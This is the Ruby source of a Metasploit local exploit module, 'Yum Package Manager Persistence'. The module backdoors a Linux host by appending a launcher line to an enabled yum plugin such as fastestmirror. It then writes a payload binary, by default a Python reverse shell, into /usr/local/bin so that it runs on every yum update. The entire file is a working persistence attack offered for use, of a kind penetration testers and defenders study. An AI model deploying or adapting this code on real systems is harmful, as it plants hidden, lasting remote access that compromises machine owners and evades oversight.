# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Yum Package Manager Persistence&#039;,
      &#039;Description&#039;    => %q(
        This module will run a payload when the package manager is used. No
        handler is ran automatically so you must configure an appropriate
        exploit/multi/handler to connect. Module modifies a yum plugin to
        launch a binary of choice. grep -F &#039;enabled=1&#039; /etc/yum/pluginconf.d/
        will show what plugins are currently enabled on the system.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [&#039;Aaron Ringo&#039;],
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;unix&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_CMD,
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;DefaultOptions&#039; => {
                            &#039;WfsDelay&#039; => 0, &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                            &#039;Payload&#039;  => &#039;cmd/unix/reverse_python&#039;
                          },
      &#039;DisclosureDate&#039; => &#039;2003-12-17&#039;, # Date published, Robert G. Browns documentation on Yum
      &#039;References&#039;     => [&#039;URL&#039;, &#039;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins&#039;],
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        # /usr/lib/yum-plugins/fastestmirror.py is a default enabled plugin in centos
        OptString.new(&#039;PLUGIN&#039;, [true, &#039;Yum Plugin to target&#039;, &#039;fastestmirror&#039;]),
        OptString.new(&#039;BACKDOOR_NAME&#039;, [false, &#039;Name of binary to write&#039;])
      ])

    register_advanced_options(
      [
        OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/usr/local/bin/&#039;]),
        OptString.new(&#039;PluginPath&#039;, [true, &#039;Plugin Path to use&#039;, &#039;/usr/lib/yum-plugins/&#039;])
      ])
  end

  def exploit
    # checks /usr/lib/yum-plugins/PLUGIN.py exists and is writeable
    plugin = datastore[&#039;PLUGIN&#039;]
    full_plugin_path = "#{datastore[&#039;PluginPath&#039;]}#{plugin}.py"
    print_status(full_plugin_path)
    unless writable? full_plugin_path
      fail_with Failure::BadConfig, "#{full_plugin_path} not writable, does not exist, or yum is not on system"
    end

    # /etc/yum.conf must contain plugins=1 for plugins to run at all
    plugins_enabled = cmd_exec "grep -F &#039;plugins=1&#039; /etc/yum.conf"
    unless plugins_enabled.include? &#039;plugins=1&#039;
      fail_with Failure::NotVulnerable, &#039;Plugins are not set to be enabled in /etc/yum.conf&#039;
    end
    print_good(&#039;Plugins are enabled!&#039;)

    # /etc/yum/pluginconf.d/PLUGIN.conf must contain enabled=1
    plugin_conf = "/etc/yum/pluginconf.d/#{plugin}.conf"
    plugin_enabled = cmd_exec "grep -F &#039;enabled=1&#039; #{plugin_conf}"
    unless plugin_enabled.include? &#039;enabled=1&#039;
      print_bad("#{plugin_conf} plugin is not configured to run")
      fail_with Failure::NotVulnerable, "try: grep -F &#039;enabled=1&#039; /etc/yum/pluginconf.d/*"
    end

    # plugins are made in python and generate pycs on successful execution
    unless exist? "#{full_plugin_path}c"
      print_warning(&#039;Either Yum has never been executed, or the selected plugin has not run&#039;)
    end

    # check for write in backdoor path and set/generate backdoor name
    backdoor_path = datastore[&#039;WritableDir&#039;]
    unless writable? backdoor_path
      fail_with Failure::BadConfig, "#{backdoor_path} is not writable"
    end
    backdoor_name = datastore[&#039;BACKDOOR_NAME&#039;] || rand_text_alphanumeric(5..10)
    backdoor_path << backdoor_name

    # check that the plugin contains an import os, to backdoor
    import_os_check = cmd_exec "grep -F &#039;import os&#039; #{full_plugin_path}"
    unless import_os_check.include? &#039;import os&#039;
      fail_with Failure::NotVulnerable, "#{full_plugin_path} does not import os, which is odd"
    end

    # check for sed binary and then append launcher to plugin underneath
    print_status(&#039;Attempting to modify plugin&#039;)
    launcher = "os.system(&#039;setsid #{backdoor_path} 2>/dev/null \\& &#039;)"
    sed_path = cmd_exec "command -v sed"
    unless sed_path.include?(&#039;sed&#039;)
      fail_with Failure::NotVulnerable, &#039;Module uses sed to modify plugin, sed was not found&#039;
    end
    sed_line = "#{sed_path} -ie \"/import os/ a #{launcher}\" #{full_plugin_path}"
    cmd_exec sed_line

    # actually write users payload to be executed then check for write
    if payload.arch.first == &#039;cmd&#039;
      write_file(backdoor_path, payload.encoded)
    else
      write_file(backdoor_path, generate_payload_exe)
    end
    unless exist? backdoor_path
      fail_with Failure::Unknown, "Failed to write #{backdoor_path}"
    end

    # change perms to reflect bins in /usr/local/bin/, give good feels
    chmod(backdoor_path, 0755)
    print_status("Backdoor uploaded to #{backdoor_path}")
    print_status(&#039;Backdoor will run on next Yum update&#039;)
  end
end

